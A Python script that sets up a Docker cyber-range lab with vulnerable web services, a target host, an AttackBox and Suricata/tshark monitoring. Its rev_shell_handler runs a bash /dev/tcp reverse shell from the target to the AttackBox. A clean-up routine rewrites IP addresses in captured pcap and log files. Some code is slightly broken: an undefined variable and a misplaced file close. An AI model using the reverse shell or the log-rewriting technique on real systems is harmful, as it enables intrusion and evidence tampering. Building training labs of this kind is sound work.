#!/usr/bin/env python3
import os
import re
import stat
import time
import json
import docker
import signal
import socket
import psutil
import argparse
import binascii
import requests
import psycopg2
import subprocess
import multiprocessing as mp

from io import BytesIO
from scapy.all import *
from mysql.connector import connect, Error

from ipaddress import ip_network, ip_address


docker_client = docker.DockerClient(base_url='unix://var/run/docker.sock')

api_client = docker.APIClient(base_url='unix://var/run/docker.sock')

containers = []

dir_path = os.path.dirname(os.path.realpath(__file__))

pcap_file = "capture_{}.pcap".format(time.strftime("%d%m%Y"))

output_fldr = "{}/output_files/{}".format(dir_path,time.strftime("%d-%m-%Y_%H%M"))

class Container:
    #def __init__(self, name, image, ipv4_addr, svc_check, default_port, run_as_user, command, environment=[], volumes=[], capabilities=[]):
    def __init__(self, name, image, ipv4_addr=None, svc_check=None, default_port=None, run_as_user=None, command=None, environment=None, volumes=None, capabilities=None, devices=None, **kw):

        #key_word_args = ["ipv4_addr","svc_check","default_port","run_as_user","command","environment", "volumes", "capabilities"]

        self.name = name
        self.image = image
        self.ipv4_addr = ipv4_addr
        self.svc_check = svc_check
        self.default_port = default_port
        self.run_as_user = run_as_user
        self.command = command
        self.environment = environment
        self.volumes = volumes
        self.capabilities = capabilities
        self.devices = devices

def log_clean_up():
    with open("{}/resource_files/{}".format(dir_path,pcap_file), 'rb') as f:
        content = f.read()

    hex_str = binascii.hexlify(content).decode('ascii')

    rpl_hex_str = hex_str.replace("ac120001","ac12009d")

    file_str = binascii.unhexlify(rpl_hex_str)

    with open("{}/{}".format(output_fldr,pcap_file), 'wb') as f:
        f.write(file_str)

    os.chown("{}/{}".format(output_fldr,pcap_file),1001,1001)

    for root, dirs, files in os.walk("{}/resource_files/logfiles".format(dir_path)):
        for file in [os.path.join(root, f) for f in files]:
            os.chown(file,1001,1001)
            os.chmod(file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)

            with open(file, 'r') as file_in :
                filedata = file_in.read()

            filedata = filedata.replace('"172.18.0.1"', '"172.18.0.157"')
            filedata = filedata.replace('172.18.0.1:', '172.18.0.157:')

            with open("{}/{}".format(output_fldr,os.path.basename(file)), 'w') as file_out:
                file_out.write(filedata)

    bits, _ = api_client.get_archive("AttackBox", '/var/log/syslog')

    tar_f = open('{}/AttackBox_Syslog.tar'.format(output_fldr), 'wb')

    for chunk in bits:
        tar_f.write(chunk)
        tar_f.close()
    
    #TODO add in elasticdump commands here
    
    # Need to dynamically pull the filebeat indices and then we should be good to just parse as a docker command
    
    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_mapping.json --type=mapping
    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp ^Casticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_analyzer.json --type=analyzer
    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_data.json --type=data

    
    print("\nShutting down - Output files saved in {}".format(output_fldr))


def clean_exit(sig, frame):
    #ac120001 = 172.18.0.1 - Host (browser activity etc)
    #ac12009d = 172.18.0.157 - AttackBox
    
    log_clean_up()

    sys.exit(0)


def local_docker_check(image):
    try:
        docker_client.images.get(image)
    except docker.errors.ImageNotFound:#
        print("{} not found locally - Pulling image".format(image))
        docker_client.images.pull(image)

        print("{} saved locally".format(image))

    return


def container_check(container_name, status_to_check=None):

    try:
        container = docker_client.containers.get(container_name)
        status = container.status
    except:
        return "removed"

    if status_to_check is not None:
        while status != status_to_check:
            time.sleep(5)
            status = container.status

    return status


def service_check(address):

    # Check the service status - Container may be running while microservice is still setting up
    response_status = 404

    while response_status != 200:
        try:
            response = requests.get(address)
        # If container/ service is "running" but not yet setup we get a connection error
        except:
            continue

        response_status = response.status_code

    return 


def rev_shell_handler(target_os):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 9876))

    while True:
        print("Listening!")
        data, (ip, port) = sock.recvfrom(2048)
        if Ether in Ether(data):
            print(data)
            if ICMP in pkt:
                cmd_in_container = api_client.exec_create(target_os, "/bin/bash -i >& /dev/tcp/172.18.0.157/4242 0>&1")
                result = api_client.exec_start(cmd_in_container, detach=True)
                 

def get_uwe_net_interface():

    uwe_net_interface = ""

    addrs = psutil.net_if_addrs()
    
    for key, val in addrs.items():
        for i in val:
            if "172.18.0.1" in i:
                uwe_net_interface = key
                break
    
    return uwe_net_interface 


def container_setup(Container, use_sdk, subprocess_list=[], on_running_cmds=[]):

    dbs_list = ["mysql", "postgresql"]

    if container_check(Container.name) != "running":

        local_docker_check(Container.image)

        if len(subprocess_list) >= 2:

            subprocess_type = subprocess_list[0]
            subprocess_cmd = subprocess_list[1]

            if subprocess_type == "run":
                subprocess.run(['gnome-terminal', '-x', 'bash', '-c', subprocess_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

            if subprocess_type == "popen":
                subprocess.Popen(['gnome-terminal', '-x', 'bash', '-c', subprocess_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

        if use_sdk:
            container = docker_client.containers.create(Container.image,
            detach=True, 
            name=Container.name,
            user=Container.run_as_user,
            command=Container.command, 
            environment=Container.environment,
            volumes=Container.volumes,
            cap_add=Container.capabilities)

            network_name = ""

            if ip_address(Container.ipv4_addr) in ip_network("172.18.0.0/24"):
                network_name = "uwe_tek_external"

            if ip_address(Container.ipv4_addr) in ip_network("172.19.0.0/24"):
                network_name = "uwe_tek_internal"

            docker_client.networks.get(network_name).connect(Container.name,ipv4_address=Container.ipv4_addr)

            container.start()

        container_status = ""

        # Wait for container(s) to come online
        while container_status != "running":
            time.sleep(5)
            container_status = container_check(Container.name)
        
        containers.append(Container.name)

        if Container.name.lower() in dbs_list:
            no_connection = True
            # DBS connection check
            while no_connection:
                time.sleep(5)
                try:
                    with connect(
                        host=Container.ipv4_addr,
                        user="test",
                        password="ing",
                    ) as connection:
                        break
                except Error as e:
                    if "Access denied for user" in str(e):
                        no_connection = False

        if Container.svc_check != None:
            service_check(Container.svc_check)

        if len(on_running_cmds) >= 1:
            for cmd in on_running_cmds:

                cmd_create = api_client.exec_create(Container.name, cmd)
            
                cmd_execute = api_client.exec_start(cmd_create, detach=True)
        
    return "{} is up and running and can be accessed on {}:{}\n".format(Container.image,Container.ipv4_addr,Container.default_port)


def network_create(req_network, network_subnets):

    count = 18
    
    while True:
        req_network_subnet = "172.{}.0.0/24".format(str(count))

        if req_network_subnet not in network_subnets:
            break
        else:
            count += 1

    ipam_pool = docker.types.IPAMPool(subnet=req_network_subnet)

    ipam_config = docker.types.IPAMConfig(pool_configs=[ipam_pool])

    api_client.create_network(req_network,ipam=ipam_config)

    print("{} network created - Subnet = {}".format(req_network,req_network_subnet))

    return


def sub_network_check():

    network_list = api_client.networks()

    network_subnets = []

    required_networks = ["uwe_tek_external", "uwe_tek_internal"]

    for req_network in required_networks:

        req_network_exists = False

        for network in network_list:
            if network["Name"] == req_network:
                print("{} network found - Subnet = {}".format(req_network,network["IPAM"]["Config"][0]["Subnet"]))
                req_network_exists = True
                break
            if len(network["IPAM"]["Config"]) > 0:
                for i in range(0,len(network["IPAM"]["Config"])):
                    network_subnets.append(network["IPAM"]["Config"][i]["Subnet"])

        if not req_network_exists:
            network_create(req_network,network_subnets)

        network_subnets = []

    return

# Add in clean container shutdown on keyboard interrupt ...?        
if __name__ == '__main__':

    signal.signal(signal.SIGINT, clean_exit)

    supported_os = ["ubuntu", "alpine"]

    parser = argparse.ArgumentParser(description="CHANGEME")

    parser.add_argument("-os", help="Select the server OS. Accepted values are:\n{}\ndefaults to 'ubuntu'".format(supported_os), default="ubuntu")

    args = parser.parse_args()
    target_os = args.os.lower()

    running_container_info = "\n"

    if os.geteuid() != 0:
        exit("This script needs elevated privileges.\nPlease try again, this time using 'sudo'. Exiting.")

    if target_os not in supported_os:
        exit("{} is not a support os. Please select a supported OS:\n{}".format(target_os,str(supported_os)))

    mysql_container = Container("mysql", "uwe_mysql:101", ipv4_addr="172.18.0.6", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])

    phpmyadmin_container = Container("phpmyadmin", "phpmyadmin:5.2.0", ipv4_addr="172.18.0.14", svc_check="http://172.18.0.14", environment=["PMA_HOST={}".format(mysql_container.ipv4_addr)], volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])

    joomla_container = Container("joomla", "uwe_joomla:101", ipv4_addr="172.18.0.15", svc_check="http://172.18.0.15", environment=["JOOMLA_DB_HOST={}:3306".format(mysql_container.ipv4_addr)], volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
    
    postgres_container = Container("postgres", "uwe_postgres:101", ipv4_addr="172.18.0.5", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])

    confluence_container = Container("confluence", "uwe_confluence:101", svc_check="http://172.18.0.16:8090")

    tomcat_container = Container("tomcat", "uwe_tomcat:101", svc_check="http://172.18.0.17:8080")

    wordpress_container = Container("wordpress", "uwe_wordpress:101", ipv4_addr="172.18.0.18", svc_check="http://172.18.0.18", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])

    httpd_container = Container("httpd", "uwe_httpd:101", ipv4_addr="172.19.0.11", volumes=['{}/resource_files/Custom_Containers/Configs/httpd.conf:/usr/local/apache2/conf/httpd.conf:ro'.format(dir_path), 
        '{}/resource_files/Custom_Containers/htdocs:/usr/local/apache2/htdocs/'.format(dir_path),
        "/etc/timezone:/etc/timezone:ro",
        "/etc/localtime:/etc/localtime:ro"], capabilities=["NET_ADMIN","NET_RAW"])

    dnsmasq_container = Container("dnsmasq", "uwe_dnsmasq:101", ipv4_addr="172.19.0.53", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"], capabilities=["NET_ADMIN","NET_RAW"])

    opensmtpd_container = Container("opensmtpd", "uwe_opensmtpd:101", ipv4_addr="172.19.0.25", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"], capabilities=["NET_ADMIN","NET_RAW"])

    random_traffic_container = Container("random_traffic", "uwe_traffic_generator:101", ipv4_addr="172.18.0.42", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"],command='172.18.0.18 "home;index;hello;wp-admin"')

    target_container = Container("target", "uwe_{}:101".format(target_os), ipv4_addr="172.18.0.200", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])

    attackbox_container = Container("AttackBox", "uwe_attackbox:101") 

    filebeat_container = Container("filebeat", "docker.elastic.co/beats/filebeat:7.17.2", ipv4_addr="172.18.0.12", run_as_user="root", command="-strict.perms=false", environment=["output.elasticsearch.hosts=['172.18.0.10:9200']"], volumes=['{}/resource_files/Custom_Containers/Configs/filebeat.docker.yml:/usr/share/filebeat/filebeat.yml:ro'.format(dir_path), 
        '{}/resource_files/Custom_Containers/Configs/filebeat_suricata.yml:/usr/share/filebeat/modules.d/suricata.yml:ro'.format(dir_path),
        '{}/resource_files/logfiles:/var/log/suricata/:ro'.format(dir_path),
        '/var/lib/docker/containers:/var/lib/docker/containers:ro', 
        "/var/run/docker.sock:/var/run/docker.sock:ro",
        "/etc/timezone:/etc/timezone:ro",
        "/etc/localtime:/etc/localtime:ro"])

    suricata_container = Container("suricata", "uwe_suricata:101")

    elasticsearch_container = Container("elasticsearch", "elasticsearch:7.17.2", ipv4_addr="172.18.0.10", svc_check="http://172.18.0.10:9200", default_port="9200", environment=["discovery.type=single-node"], volumes=["/etc/timezone:/etc/timezone:ro", "/etc/localtime:/etc/localtime:ro"])

    kibana_container = Container("kibana", "kibana:7.17.2", ipv4_addr="172.18.0.11", svc_check="http://172.18.0.11:5601/status", default_port="5601", volumes=["/etc/timezone:/etc/timezone:ro", "/etc/localtime:/etc/localtime:ro"])
        
    containers_to_run ={

        #"mysql":[mysql_container,True,[],[]],
        #"phpmyadmin":[phpmyadmin_container,True,[],[]],
        #"joomla":[joomla_container,True,[],[]],
        "postgres":[postgres_container,True,[],[]],
        "confluence":[confluence_container,False,["popen",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro --name confluence --net uwe_tek_external --ip 172.18.0.16 -it uwe_confluence:101'],["nohup bash /tomcat_to_stdout.sh &"]],
        "tomcat":[tomcat_container,False,["popen",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro --name tomcat --net uwe_tek_external --ip 172.18.0.17 -it uwe_tomcat:101'],["nohup bash /tomcat_to_stdout.sh &"]],
        "wordpress":[wordpress_container,True,[],[]],
        #"httpd":[httpd_container,True,[],[]],
        #"dnsmasq":[dnsmasq_container,True,[],[]],
        #"opensmtpd":[opensmtpd_container,True,[],[]],
        "random_traffic":[random_traffic_container,True,[],[]],
        
    }

    required_containers ={

        "target":[target_container,True,[],[]],
        "attackbox":[attackbox_container,False,["popen",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro -v {}/exploit_material/:/exploit_material/ --name AttackBox --net uwe_tek_external --ip 172.18.0.157 --cap-add=NET_ADMIN --cap-add=NET_RAW -it uwe_attackbox:101'.format(dir_path)],["rsyslogd"]],
        #"filebeat":[filebeat_container,True,["run",'docker run --rm --name=filebeat_setup --net uwe_tek_external --ip 172.18.0.9 docker.elastic.co/beats/filebeat:7.17.2 setup -E setup.kibana.host=172.18.0.11:5601 -E output.elasticsearch.hosts=["172.18.0.10:9200"]'],[]],
        "suricata":[suricata_container,False,["run",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro -d --name suricata --net=host --cap-add=net_admin --cap-add=net_raw --cap-add=sys_nice -v {}/resource_files/logfiles:/var/log/suricata uwe_suricata:101 -i {}'.format(dir_path,get_uwe_net_interface())],[]],
        #"elasticsearch":[elasticsearch_container,True,[],[]],
        #"kibana":[kibana_container,True,[],[]],
    
    }

    sub_network_check()
    
    for _, v in containers_to_run.items():
        running_container_info += container_setup(v[0],v[1],v[2],v[3])

    # Done last to avoid polluting logs with setup connections etc
    for _, v in required_containers.items():
        running_container_info += container_setup(v[0],v[1],v[2],v[3])


    print("----------------------------------------------------------------")
    print(running_container_info.replace("None", ""))
    print("----------------------------------------------------------------")

    #TODO - make the blacklist ammendable so we can add confluence etc on the fly
    
    os.umask(0)
    
    capture_output = "{}/resource_files/{}".format(dir_path,pcap_file)
    
    if not os.path.exists(capture_output):
        os.mknod(capture_output, mode = 0o666)
        
    if not os.path.isdir(output_fldr):
        os.makedirs(output_fldr)
        
    process = subprocess.Popen(['/usr/bin/tshark', '-i', 'any', '-w', capture_output, 'src', 'net', '172.18.0.0/24', 'and', 'dst', 'net', '172.18.0.0/24', 'and', 'host', 'not', '172.18.0.10', 'and', 'host', 'not', '172.18.0.11', 'and', 'host', 'not', '172.18.0.12'],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
    
    print(process.stdout.read())